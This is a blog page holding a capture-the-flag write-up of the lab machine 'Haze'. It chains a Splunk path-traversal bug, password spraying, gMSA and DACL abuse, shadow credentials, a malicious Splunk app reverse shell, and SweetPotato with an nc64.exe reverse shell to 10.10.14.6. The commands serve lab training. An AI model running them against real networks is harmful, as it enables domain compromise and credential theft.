<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Haze-Windows-Hard | Pwn3d777</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Haze-Windows-Hard" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Haze" />
<meta property="og:description" content="Haze" />
<link rel="canonical" href="https://your-site-url/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f.html" />
<meta property="og:url" content="https://your-site-url/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f.html" />
<meta property="og:site_name" content="Pwn3d777" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-07-20T16:05:57+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Haze-Windows-Hard" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-20T16:05:57+00:00","datePublished":"2025-07-20T16:05:57+00:00","description":"Haze","headline":"Haze-Windows-Hard","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f.html"},"url":"https://your-site-url/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
<div class="post">
  <h1 class="post-title">Haze-Windows-Hard</h1>
  
  <div class="post-date">
    Published on 20 Jul 2025
    
  </div>
  
  <h1 id="haze">Haze</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
Start port enumeration
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_1.png" alt="image.png" />
<br /><br />
Splunk web service is running on port 8000, a login form is displayed but we don’t have any credentials yet
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_2.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Search the internet to identify vulnerabilities like CVE-2024-36991. Arbitrary file read through reverse path traversal, this is possible thanks to <code class="language-plaintext highlighter-rouge">os.path.join</code> which concatenates the whole path ignoring any part of the string that includes a drive letter (<code class="language-plaintext highlighter-rouge">c:</code> in this case) 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_3.png" alt="image.png" />
<br /><br />
The next payload will be processed by the function and it will take the first <code class="language-plaintext highlighter-rouge">C:</code> probably located in the backend and it will ignore any other <code class="language-plaintext highlighter-rouge">C:</code> references treating the next as part of the path, in this way, path traversal filtering will be bypassed disclosing files outside the current directory
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_4.png" alt="image.png" />
<br /><br />
Check <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to confirm this environment is vulnerable, some hashes were found but they are not easy crackeable
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_5.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_6.png" alt="image.png" />
<br /><br />
Chat-gpt helps us to locate interesting taking advantage of splunk
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_7.png" alt="image.png" />
<br /><br />
The secret is disclosed, now we need hashes to crack with this secret
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_8.png" alt="image.png" />
<br /><br />
In the configuration files we will discover some hashes
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_9.png" alt="image.png" />
<br /><br />
However, only in the authentication file does a hash have a Common Name
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_10.png" alt="image.png" />
<br /><br />
Use <code class="language-plaintext highlighter-rouge">splunksecrets</code> tool to decrypt the hash found using the secret disclosed
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_11.png" alt="image.png" />
<br /><br />
Make sure that this password is valid on ldap authentication
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_12.png" alt="image.png" />
<br /><br />
It’s time to enumerate user in the domain
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_13.png" alt="image.png" />
<br /><br />
Use those users to spray the password
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_14.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">mark.adams</code> is also using the same password, we can check if there are any useful share to obtain more information but this step did not succeed
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_15.png" alt="image.png" />
<br /><br />
Those credentials might be convenient for enumerating the entire domain using <code class="language-plaintext highlighter-rouge">bloodhound-python</code>
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_16.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">Mark.adams</code> account is member of <code class="language-plaintext highlighter-rouge">GMSA_MANAGERS</code> group
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_17.png" alt="image.png" />
<br /><br />
We can confirm that using Powershell
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_18.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_19.png" alt="image.png" />
<br /><br />
Attackers can abuse misconfigured gMSA to escalate privileges. This group (Group Managed Service Account) are assigned to automate password rotation but  only specific accounts should have <code class="language-plaintext highlighter-rouge">readgMSApassword</code> privilege, in this scenario we have compromised a gMSA manager’s member.
<br /><br />
Bloodhound did not display members of gMSA. To enumerate users in the domain and identify which accounts can retrieve gMSA passwords or modify its properties, we can execute the following commands:
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="o">-</span><span class="n">Filter</span> <span class="o">*</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAcount</span> <span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup</span> <span class="o">-</span><span class="n">Property</span> <span class="n">PrincipalsAllowedToRetrieveManagedPassword</span>
<span class="c1">#Who can modify this property?
</span><span class="err">$</span><span class="n">backupuser</span> <span class="o">=</span> <span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup</span>
<span class="p">(</span><span class="n">Get</span><span class="o">-</span><span class="n">Acl</span> <span class="s">"AD:\$($backupuser.DistinguishedName)"</span><span class="p">).</span><span class="n">Access</span> <span class="o">|</span> <span class="n">Where</span><span class="o">-</span><span class="n">Object</span> <span class="p">{</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-</span><span class="n">like</span> <span class="s">'*gMSA_Manage'</span><span class="p">}</span>
</code></pre></div></div>
<p><br /><br />
Other options to shortcut this enumeration could be:
<br /><br /></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">get writeables</code> in <code class="language-plaintext highlighter-rouge">bloodyAD</code></li>
  <li>Find-<code class="language-plaintext highlighter-rouge">InterestingDomainAcl</code> in <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> module
<br /><br />
Once we know gMSA managers can set Haze-IT-Backup property to retrieve its managed password we proceed to abuse this
<br /><br />
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="o">-</span><span class="n">Identity</span> <span class="s">"Haze-IT-Backup"</span> <span class="o">-</span><span class="n">PrincipalsAllowedToRetrieveManagedPassword</span> <span class="s">"mark.adams"</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_20.png" alt="image.png" />
<br /><br />
This misconfiguration can be leverage to obtain the NTLM hash of the backup account
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nxc</span> <span class="n">ldap</span> <span class="n">ip</span> <span class="o">-</span><span class="n">u</span> <span class="n">user</span> <span class="o">-</span><span class="n">p</span> <span class="n">password</span> <span class="o">--</span><span class="n">gmsa</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_21.png" alt="image.png" />
<br /><br />
Haze-IT-Backup has WriteOwner permissions over support_services group, but seems to be something else to investigate
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_22.png" alt="image.png" />
<br /><br />
Execute the <code class="language-plaintext highlighter-rouge">bloodhound-python</code> collector again, this time using backup user’s credentials
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_23.png" alt="image.png" />
<br /><br />
Now the path forward is clearer
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_24.png" alt="image.png" />
<br /><br />
Set <code class="language-plaintext highlighter-rouge">haze-it-backup</code> as the new owner of <code class="language-plaintext highlighter-rouge">support_services</code> and grant it <code class="language-plaintext highlighter-rouge">full-control</code> over the group
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">impacker</span><span class="o">-</span><span class="n">owneredit</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">new</span><span class="o">-</span><span class="n">owner</span> <span class="s">'new-owner'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">dn</span> <span class="s">'target-dn'</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'user'</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span>
<span class="n">impacket</span><span class="o">-</span><span class="n">dacledit</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">rights</span> <span class="n">FullControl</span> <span class="o">-</span><span class="n">principal</span> <span class="s">'attacker'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">dn</span> <span class="s">'target-dn'</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'user'</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span>
<span class="c1">#Or without imapcket 
</span><span class="n">pth</span><span class="o">-</span><span class="n">net</span> <span class="n">rpc</span> <span class="n">group</span> <span class="n">addmem</span> <span class="s">"SUPPORT_SERVICE"</span> <span class="n">attackeruser</span> <span class="o">-</span><span class="n">U</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'attacker'</span><span class="o">%</span><span class="s">'fffto_supply_right_format'</span><span class="p">:</span><span class="s">'hash'</span> <span class="o">-</span><span class="n">S</span> <span class="n">ip</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_25.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_26.png" alt="image.png" />
<br /><br />
We have three options right now:
<br /><br /></p>
  </li>
  <li>Change edward.martin password’s (Faster but not a clean OPSEC, and not allowed in this machine)
<br /><br /></li>
  <li>Request a TGT again and use certipy shadow credential to obtain edward hash (Automated and faster)
<br /><br /></li>
  <li>Using pywhisker → gettgtpkinit → getnthash (A manual and more granular approach)
<br /><br />
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#To update msDS-KeyCredentialLink and obtain a PFX from this link
</span><span class="n">python3</span> <span class="n">pywhisker</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s">'attacker'</span> <span class="o">-</span><span class="n">H</span> <span class="p">:</span><span class="nb">hash</span> <span class="o">-</span><span class="n">d</span> <span class="n">domain</span> <span class="o">-</span><span class="n">t</span> <span class="s">'target'</span> <span class="o">-</span><span class="n">a</span> <span class="n">add</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_27.png" alt="image.png" />
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Get a tgt using the PFX file generated previously
</span><span class="n">python</span> <span class="n">gettgtpkinit</span> <span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">pfx</span> <span class="p">.</span><span class="n">pxf</span> <span class="o">-</span><span class="n">pfx</span><span class="o">-</span><span class="k">pass</span> <span class="n">pfxpass</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="n">domain</span><span class="o">/</span><span class="n">target</span> <span class="n">target</span><span class="p">.</span><span class="n">ccfile</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_28.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_29.png" alt="image.png" />
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Get a NT hash using that tgt
</span><span class="n">python</span> <span class="n">getnthash</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="o">-</span><span class="n">key</span> <span class="n">key</span> <span class="n">domain</span><span class="o">/</span><span class="n">target</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_30.png" alt="image.png" />
<br /><br />
We can spawn a <code class="language-plaintext highlighter-rouge">edward.martin</code> shell using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to obtain the user flag
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_31.png" alt="image.png" />
<br /><br /></p>
    <h1 id="3priv-esc">3.Priv esc</h1>
    <p><br /><br />
Check the splunk directories until you locate a backup
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_32.png" alt="image.png" />
<br /><br />
Another version of the files we have abused early was in there with different hash and different secret
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_33.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_34.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_35.png" alt="image.png" />
<br /><br />
Crack the hash we found
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_36.png" alt="image.png" />
<br /><br />
It is supposed <code class="language-plaintext highlighter-rouge">alexander.green</code> credentials
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_37.png" alt="image.png" />
<br /><br />
Log in with that password in the main web application service as the admin user 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_38.png" alt="image.png" />
<br /><br />
From here, it is straightforward, find how to exploit a reverse shell in splunk 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_39.png" alt="image.png" />
<br /><br />
Set ip and port in <code class="language-plaintext highlighter-rouge">run.ps1</code> as we are dealing with a Windows machine 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_40.png" alt="image.png" />
<br /><br />
Follow the instructions in the repository. Compress those files
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_41.png" alt="image.png" />
<br /><br />
Then, upload them as an app installation in splunk
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_42.png" alt="image.png" />
<br /><br />
It is successfully installed, we only need to enable it to trigger the reverse shell
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_43.png" alt="image.png" />
<br /><br />
After obtaining a shell, enumerating Alexander’s privileges we discovered <code class="language-plaintext highlighter-rouge">SeImpersonatePriviele</code> 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_44.png" alt="image.png" />
<br /><br />
This privilege allow us to use a process to impersonate another user, <code class="language-plaintext highlighter-rouge">SweetPotato</code> pr <code class="language-plaintext highlighter-rouge">godpotato</code> are recommended tools for this task
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span>\<span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">a</span> <span class="s">'type c:\users</span><span class="se">\a</span><span class="s">dministrator\desktop</span><span class="se">\r</span><span class="s">oot.txt'</span>
<span class="c1">#Or upload a nc.exe file and execute
</span><span class="p">.</span>\<span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">a</span> <span class="s">"C:\programdata</span><span class="se">\n</span><span class="s">c64.exe 10.10.14.6 444 -e cmd.exe"</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_45.png" alt="image.png" />
<br /><br />
Machine pwned@!@@!@
<script src="/assets/js/matrix-overlay.js"></script></p>
  </li>
</ul>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://your-site-url/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f.html';
     this.page.identifier = '/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f';
     this.page.title = 'Haze-Windows-Hard';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/writeups/2025/08/24/25394fcc-7e99-4c50-a851-13c850b39132-export-00214464-ccf0-40e0-91e1-e970405d3d75.html">
            TheFrizz-Windows-Medium
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/08/17/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91.html">
            Nocturnal-Linux-Easy
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/08/09/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4.html">
            University-Windows-Insane
          </a>
        </h3>
      </li>
    
  </ul>
</div>






<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
